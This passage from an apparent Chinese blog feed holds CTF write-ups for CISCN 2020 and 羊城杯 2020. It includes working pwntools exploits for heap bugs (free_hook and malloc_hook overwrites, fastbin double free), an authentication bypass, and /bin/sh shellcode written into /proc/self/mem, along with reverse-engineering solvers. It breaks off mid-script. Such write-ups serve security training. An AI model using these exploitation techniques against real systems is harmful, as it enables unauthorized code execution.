class="headerlink" title="exp"></a>exp</h3></li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.12.248'</span>,<span class="hljs-number">50001</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'Input index:'</span>,str(idx))    sla(<span class="hljs-string">'Input size'</span>,str(size))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'4.show'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>    add(i,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">10</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">11</span>,<span class="hljs-number">0xff</span>,payload)add(<span class="hljs-number">12</span>,<span class="hljs-number">0xff</span>,payload)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span>add(<span class="hljs-number">6</span>,<span class="hljs-number">0xff</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + <span class="hljs-string">'2'</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)edit(<span class="hljs-number">6</span>,payload)show(<span class="hljs-number">6</span>)ru(<span class="hljs-string">'22222222'</span>)r(<span class="hljs-number">8</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>)edit(<span class="hljs-number">6</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">13</span>,<span class="hljs-number">0xff</span>,payload)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x80</span>) + p64(free_hook)edit(<span class="hljs-number">13</span>,payload)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">14</span>,<span class="hljs-number">0xff</span>,payload)one = <span class="hljs-number">0x4f3c2</span> + libc_baseadd(<span class="hljs-number">15</span>,<span class="hljs-number">0xff</span>,payload)edit(<span class="hljs-number">15</span>,p64(one))free(<span class="hljs-number">14</span>)itr()</code></pre></div><h2 id="safe-shell"><a href="#safe-shell" class="headerlink" title="safe shell"></a>safe shell</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="登陆函数："><a href="#登陆函数：" class="headerlink" title="登陆函数："></a>登陆函数：</h4><div class="hljs"><pre><code class="hljs c">!<span class="hljs-built_in">strcmp</span>(name, &amp;s) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(password, &amp;ptr);</code></pre></div><p>在最后的验证是用strcmp，会被<code>\x00</code>给截断，并且服务器上的admin.txt上来也是空的。直接设置name与password均为<code>\x00</code>即可绕过。</p><h4 id="shell函数："><a href="#shell函数：" class="headerlink" title="shell函数："></a>shell函数：</h4><ul><li>都是围绕<code>/proc/self/</code>目录下的操作</li><li><code>set_lseek</code>可以修改读取某文件指针，也就是open以后默认操作读写指针是指向文件的开头的，通过它可以修改这个指针的在这个文件上指向</li><li>write 一次只能写8字节</li></ul><p>重点是了解<code>/proc/pid/</code>目录下文件的信息与含义。<br><a href="https://blog.csdn.net/enweitech/article/details/53391567" target="_blank" rel="noopener">https://blog.csdn.net/enweitech/article/details/53391567</a></p><p><strong>特别注意 mmaps 和 mem</strong></p><h5 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h5><p>是当前进程的内存映射关系，存放着内存分布图，类似于gdb中vmmap，可以泄漏一下程序的基地址。</p><h5 id="mem"><a href="#mem" class="headerlink" title="mem"></a>mem</h5><ul><li>包含了程序进程在内存中的内容；</li><li>通过修改该文件相当于直接修改当前进程的内存</li><li>/ proc / $pid / mem以与进程中相同的方式显示$pid的内存映射,即伪文件中偏移x处的字节与进程中地址x处的字节相同.。</li><li>结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</li></ul><p>写入mem文件也相当于修改程序在内存的本身了，结合mmaps的程序基址，在合适的地方写入shellcode，让程序走到这里即可get shell</p><h4 id="防御函数："><a href="#防御函数：" class="headerlink" title="防御函数："></a>防御函数：</h4><p>在监测到3次密码错误后，开始拒绝连接，并且会在<code>admin.txt</code>中写入随机的512个字母数字组合的字符。这样就基本登陆不上去了,因为是随机的，并且name跟password最大也就是0x100的长度。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>绕过check，登入diy shell </li><li>读入mmaps，leak 出 程序的base</li><li>open mem文件，准备写入</li><li>确定写入偏移为help后<code>0x16CC + base</code>,通过<code>set_lseek</code>来修改指针指向</li><li>wirte 写入8字节shellcode</li><li>通过<code>set_lseek</code>来修改指针+8，再次写入，循环写好shellcode</li><li>输入help即可</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./safe_shell'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'\x00'</span>)sa(<span class="hljs-string">'pass'</span>,<span class="hljs-string">'\x00'</span>)sl(<span class="hljs-string">'readonly'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'maps'</span>)s = ru(<span class="hljs-string">'-5'</span>)s = s[<span class="hljs-number">2</span>:<span class="hljs-number">14</span>]base = int(s,<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'base'</span>,base)patch_addr = <span class="hljs-number">0x16CC</span> + basesl(<span class="hljs-string">'open'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'mem'</span>)shellcode = <span class="hljs-string">'\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> range(len(shellcode)//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>):    sl(<span class="hljs-string">'set_lseek'</span>)    sla(<span class="hljs-string">' file offset'</span>,str(patch_addr + i*<span class="hljs-number">8</span>))    sla(<span class="hljs-string">'$'</span>,<span class="hljs-string">'write'</span>)    sa(<span class="hljs-string">'your context'</span>,shellcode[i*<span class="hljs-number">8</span>:(i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>)])sl(<span class="hljs-string">'help'</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ciscn-2020-华中分区赛部分wp&quot;&gt;&lt;a href=&quot;#ciscn-2020-华中分区赛部分wp&quot; class=&quot;headerlink&quot; title=&quot;ciscn  2020 华中分区赛部分wp&quot;&gt;&lt;/a&gt;ciscn  2020 华中分区赛部分wp&lt;/h1
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2020部分wp</title>
    <link href="http://chumen77.xyz/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/14/羊城杯2020部分wp/</id>
    <published>2020-09-14T12:56:01.475Z</published>
    <updated>2020-09-24T02:49:43.921Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020部分wp"><a href="#羊城杯2020部分wp" class="headerlink" title="羊城杯2020部分wp"></a>羊城杯2020部分wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下：</p><p> 在脱去以后，会有主程序，跟一个struct的文件。</p><p>要保证主程序与struct的前面的魔法字节是相同一样的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>重点关注前16个字节，保证相同即可。<br>修复好pyc后，就可以进行反编译。<br>剩下的就是逆算法，需要用到z3。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-string">'''a1 = Int('a1')a2 = Int('a2')a3 = Int('a3')a4 = Int('a4')a5 = Int('a5')a6 = Int('a6')a7 = Int('a7')a8 = Int('a8')a9 = Int('a9')a10 = Int('a10')a11 = Int('a11')a12 = Int('a12')a13 = Int('a13')a14 = Int('a14')s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)if s.check() == sat:    result = s.model()    print result'''</span><span class="hljs-string">'''[a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10]'''</span>key = [<span class="hljs-number">10</span>,<span class="hljs-number">24</span>,<span class="hljs-number">119</span>,<span class="hljs-number">7</span>,<span class="hljs-number">104</span>,<span class="hljs-number">43</span>,<span class="hljs-number">28</span>,<span class="hljs-number">91</span>,<span class="hljs-number">108</span>,<span class="hljs-number">52</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">88</span>,<span class="hljs-number">33</span>]flag = <span class="hljs-string">' '</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>):    key[i<span class="hljs-number">-1</span>] = key[i] ^ key[i - <span class="hljs-number">1</span>]    flag += chr(key[i<span class="hljs-number">-1</span>])flag = flag[::<span class="hljs-number">-1</span>]flag += chr(<span class="hljs-number">33</span>)print(flag)</code></pre></div><p>其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。<br>可以参考：<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p><p>还有遇到逻辑左移右移：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-number">1.</span> “&gt;&gt;”int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &gt;&gt; <span class="hljs-number">1</span>);先将x转成二进制 <span class="hljs-number">10000</span>, 不读最后一位， 输出 <span class="hljs-number">1000</span>， 即为<span class="hljs-number">8</span>;右移一位相当于数值除以<span class="hljs-number">2</span><span class="hljs-number">2.</span> “&lt;&lt;”int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &lt;&lt; <span class="hljs-number">1</span>);先将x转成二进制 <span class="hljs-number">10000</span>, 往最后再读取一位(<span class="hljs-number">0</span>, 或根据是否已经有移位)， 输出 <span class="hljs-number">100000</span>， 即为<span class="hljs-number">32</span>;左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数左移一位相当于数值乘以<span class="hljs-number">2</span></code></pre></div><p>在这里是左移7，也就是乘 2 的7次方。</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>3层加密.</p><ul><li>一个base64</li><li>一个以13字节，分割字符，进行移位</li><li>单字节凯撒加密，但是也加入了对数字的处理</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64key = <span class="hljs-string">'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]buf = [<span class="hljs-number">0</span>]*<span class="hljs-number">52</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">90</span>:        buf[i] = (key[i] - <span class="hljs-number">65</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">96</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">122</span>:        buf[i] =  (key[i] - <span class="hljs-number">97</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">0x61</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">57</span>:        buf[i] = (key[i] - <span class="hljs-number">48</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">10</span> + <span class="hljs-number">48</span>        <span class="hljs-keyword">continue</span>    buf[i] = key[i]buf = [chr(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> buf]key2 = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> buf:    key2 += ikey2 = key2[<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] + key2[<span class="hljs-number">39</span>:<span class="hljs-number">52</span>] + key2[:<span class="hljs-number">13</span>] + key2[<span class="hljs-number">26</span>:<span class="hljs-number">39</span>]flag = base64.b64decode(key2)print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>入门堆题，存在uaf，进行<code>fastbin attcak</code>即可。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x60</span>mes = <span class="hljs-string">'b'</span> * <span class="hljs-number">23</span>add(<span class="hljs-number">0x100</span>,payload,mes)add(<span class="hljs-number">0x60</span>,payload,mes)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>,mes)show()ru(<span class="hljs-string">"Game[2]'s name :"</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b20</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)malloc_hook = libc_base + <span class="hljs-number">0x3c4aed</span>add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))one = <span class="hljs-number">0x4527a</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0</span>) + p64(one)add(<span class="hljs-number">0x60</span>,payload,payload)itr()</code></pre></div><p>其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到<code>malloc_hook</code>，从而getshell。</p><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>只有add和del功能</li><li>存在uaf</li><li>只能申请&lt;0x70的堆块</li></ul><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><p>需要利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列。</p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p><p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p><p><code>malloc_consolidate</code>具体步骤如下：</p><ol><li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li><li>按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li><li>首先尝试合并<code>pre_chunk</code>。</li><li>然后尝试合并<code>next_chunk</code>：如果<code>next_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果<code>next_chunk</code>不是<code>top_chunk</code>，尝试合并。</li><li>将处理完的chunk插入到unsorted bin头部。</li><li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li></ol><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址</li><li>利用fastbin attack ，打<code>__IO_2_1_stdout</code>，泄漏libc</li><li>利用fastbin attack ，打<code>malloc_hook</code></li></ul><p>难点在申请堆块的数量,题目限制了19个，是刚刚够用。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span 